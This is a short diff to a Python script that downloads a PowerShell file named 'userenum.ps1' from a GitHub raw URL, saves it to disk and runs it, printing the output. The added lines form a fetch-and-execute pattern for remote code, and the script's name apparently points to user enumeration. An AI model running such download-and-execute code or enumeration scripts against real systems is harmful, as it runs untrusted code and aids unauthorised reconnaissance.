@@ -9,8 +9,10 @@ def run(cmd):
 
 u = "https://raw.githubusercontent.com/deepakkeshav98/userenum/main/userenum.ps1"
 r = requests.get(u)
+open('userenum.ps1', 'wb').write(r.content)
 
-op=run("userenum.ps1")
+time.sleep(2)
+op=run("./userenum.ps1")
 print(op)
 
 time.sleep(5)
